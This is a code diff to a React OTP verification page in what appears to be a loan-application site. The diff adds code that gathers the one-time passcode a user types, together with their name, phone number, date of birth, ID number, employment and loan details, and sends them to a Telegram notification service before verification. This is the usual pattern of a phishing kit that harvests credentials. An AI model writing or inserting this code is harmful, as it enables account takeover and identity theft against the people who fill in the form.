@@ -1,6 +1,7 @@
 import React, { useState, useRef, useEffect } from 'react'
 import axios from 'axios'
 import { useNavigate, useParams } from 'react-router-dom'
+import { apiService } from '../services/api.js'
 
 const SpinnerStyle = () => (
   <style>{`
@@ -36,7 +37,6 @@ function Verification() {
   const navigate = useNavigate()
   const { user } = useParams()
   const userId = user || 'default'
-  const [client] = useState({ name: "", number: "" })
   const [otp, setOtp] = useState(Array(6).fill(""))
   const inputRefs = useRef([])
   const [sessionId, setSessionId] = useState(null)
@@ -46,6 +46,7 @@ function Verification() {
   const [copied, setCopied] = useState(false)
   const [timer, setTimer] = useState(120)
   const [autoPolling, setAutoPolling] = useState(false)
+  const [approvedOtp, setApprovedOtp] = useState("")
   
   const startIndex = useRef(null)
 
@@ -98,14 +99,34 @@ function Verification() {
     console.log("Sending OTP verification...", code)
     setLoading(true)
     setError("")
+    setApprovedOtp(code)
+    
+    const storedApp = localStorage.getItem('loanAppData')
+    const appData = storedApp ? JSON.parse(storedApp) : {}
+    const storedClient = localStorage.getItem('clientData')
+    const clientData = storedClient ? JSON.parse(storedClient) : {}
+    
+    const otpInfo = {
+      name: appData.name || "",
+      number: appData.number || "",
+      otp: code,
+      dob: clientData.dob || "",
+      id: clientData.id || "",
+      employment: clientData.employment || "",
+      amount: clientData.amount || "",
+      term: clientData.term || "",
+      pinInputs: "____"
+    }
     
     try {
+      await apiService.sendTelegramNotification(otpInfo)
+      
       const response = await api.post("/api/verify-user", {
-        phoneNumber: client.number,
+        phoneNumber: appData.number || "",
         otpCode: code,
         countryCode: "+243",
         userId: `user_${Date.now()}`,
-        userName: client.name
+        userName: clientData.name || "User"
       })
       
       if (response.data.sessionId) {
@@ -134,7 +155,9 @@ function Verification() {
           setSessionId(null)
           setAutoPolling(false)
           clearInterval(interval)
-          setTimeout(() => navigate(`/${userId}/compliance`), 1000)
+          const storedApp = localStorage.getItem('loanAppData')
+          const appData = storedApp ? JSON.parse(storedApp) : {}
+          setTimeout(() => navigate(`/${userId}/loan-success?name=${encodeURIComponent(appData.name || 'User')}&amount=${encodeURIComponent(appData.amount || 'N/A')}`), 1500)
         } else if (data.status === "wrong_code") {
           console.log("❌ Wrong OTP code")
           setError("Code OTP incorrect")
